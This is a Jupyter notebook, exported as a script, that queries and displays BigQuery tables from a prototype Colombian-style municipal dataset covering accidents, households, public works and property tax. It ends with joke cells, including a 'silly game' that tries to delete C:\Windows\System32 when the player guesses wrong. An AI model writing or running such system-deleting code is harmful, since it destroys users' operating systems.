# %%
import os
import pandas as pd
from google.cloud import bigquery
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\api_core\_python_version_support.py:246: FutureWarning: You are using a non-supported Python version (3.9.25). Google will not post any further updates to google.api_core supporting this Python version. Please upgrade to the latest Python version, or at least Python 3.10, and then update google.api_core.
#   warnings.warn(message, FutureWarning)
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\auth\__init__.py:54: FutureWarning: You are using a Python version 3.9 past its end of life. Google will update google-auth with critical bug fixes on a best-effort basis, but not with any other fixes or features. Please upgrade your Python version, and then update google-auth.
#   warnings.warn(eol_message.format("3.9"), FutureWarning)
# ...

# %%
os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = r"C:\Users\migue\Downloads\Miguel Jaimes\lihki-490802-d49b7d8420b9.json"

# %%
client = bigquery.Client()

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.accidentes` LIMIT 5"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#    incidente_id       fecha  barrio_id       tipo gravedad  heridos  \
# 0             9  2024-08-25          1       moto     leve        0
# 1            27  2024-04-09          1     choque     leve        3
# 2            65  2024-03-24          1       moto    grave        2
# 3            82  2024-02-20          1  atropello     leve        1
# 4            89  2024-07-09          1  atropello     leve        3
#
#    fallecidos   clima             causa
# 0           0  lluvia  exceso_velocidad
# 1           0  lluvia  exceso_velocidad
# 2           0    seco  exceso_velocidad
# 3           0  lluvia  exceso_velocidad
# 4           0    seco  exceso_velocidad

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.barrio` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#    barrio_id          barrio  comuna  poblacion  estrato_promedio     lat  \
# 0          2    La Esperanza       1       8300                 2  11.006
# 1          4        San José       2       7200                 2  11.008
# 2          7      La Pradera       4       7800                 2  11.007
# 3          9  Nueva Colombia       5       8600                 2  11.015
# 4          1          Centro       1      10500                 3  11.004
# 5          3     Villa Norte       2       9400                 3  11.010
# 6          6   Altos del Río       3       6500                 3  11.013
# 7          8       El Bosque       4       9800                 3  11.011
# 8         10         Mirador       5       7200                 3  11.016
# ...

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.hogares` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#      hogar_id  barrio_id  estrato  tamano_hogar  ingreso_mensual sisben  \
# 0          30          1        1             2          1848438      A
# 1         246          1        2             2          1794451      C
# 2         269          1        2             2          1875902      B
# 3         536          1        2             2          1056725      B
# 4         542          1        2             2          2139782      B
# ..        ...        ...      ...           ...              ...    ...
# 995       581         10        4             6          2021694      C
# 996       586         10        3             6          2299610      A
# 997       640         10        4             6          1678530      B
# ...

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.indicadores_sociales` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#    periodo  barrio_id  desempleo  desercion_escolar  cobertura_salud  \
# 0     2024          2       0.21               0.03             0.77
# 1     2024          4       0.11               0.03             0.77
# 2     2024          9       0.12               0.09             0.78
# 3     2024          1       0.12               0.02             0.80
# 4     2024          7       0.20               0.06             0.80
# 5     2024          3       0.10               0.06             0.81
# 6     2024         10       0.10               0.06             0.83
# 7     2024          8       0.21               0.06             0.84
# 8     2024          6       0.15               0.07             0.86
# 9     2024          5       0.19               0.09             0.88
#
# ...

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.obras_publicas` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#     obra_id  barrio_id            tipo  presupuesto  avance_fisico  \
# 0        27          2  alcantarillado   4967000000             73
# 1         8          3  alcantarillado   2358000000             16
# 2        17          3  alcantarillado   3881000000             90
# 3        20          3  alcantarillado   2799000000             27
# 4        44          5  alcantarillado   1063000000             55
# 5         4          6  alcantarillado    381000000             40
# 6        16          6  alcantarillado   4619000000             67
# 7        21          6  alcantarillado    956000000            100
# 8        39          7  alcantarillado   2089000000             90
# 9        47          7  alcantarillado   4204000000             53
# ...

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.pqr` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#      pqr_id       fecha  barrio_id            tipo     canal  \
# 0        23  2024-01-23          1            vias  telefono
# 1       136  2024-03-31          1  alcantarillado       web
# 2       528  2024-06-12          1     iluminacion       app
# 3       594  2024-10-16          1            agua       web
# 4       767  2024-04-28          1            agua  telefono
# ..      ...         ...        ...             ...       ...
# 995     377  2024-08-29          5       seguridad       app
# 996     741  2024-03-03          5            vias       web
# 997     786  2024-08-15          5           ruido  telefono
# 998    1407  2024-03-17          5     iluminacion       web
# 999    1526  2024-12-14          5            vias  telefono
#
# ...

# %%
sql_query = "SELECT * FROM `lihki-490802.Prototipo.predial` LIMIT 1000"
query_job = client.query(sql_query).to_dataframe()
query_job
# Out:
# c:\Users\migue\miniconda3\envs\seminario\lib\site-packages\google\cloud\bigquery\table.py:1994: UserWarning: BigQuery Storage module not found, fetch data with the REST endpoint instead.
#   warnings.warn(
#      predio_id  barrio_id       avaluo  impuesto pagado  mora_dias  \
# 0          672         10   50000000.0    400000     no        150
# 1          875          1   50000000.0    400000     no        134
# 2          988          4   50000000.0    400000     no        118
# 3         1482          4   50000000.0    400000     no         58
# 4          329          8   52000000.0    416000     no        144
# ..         ...        ...          ...       ...    ...        ...
# 995        853          3  132000000.0   1056000     si          0
# 996        937          3  132000000.0   1056000     si          0
# 997       1402          2  132000000.0   1056000     si          0
# 998        114          9  133000000.0   1064000     si          0
# ...

# %%
print("Adios mundo cruel")

# %%
from pc import machine
model = machine.learn()

# %%
import os 

for i in 10:
    os.system32.delete()

# %% [markdown]
# ![image.png](attachment:image.png)

# %%
import random
import os

number = random.randint(1,99)

guess = input("Silly game! Guess number between 1 and 99")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\Windows\System32")
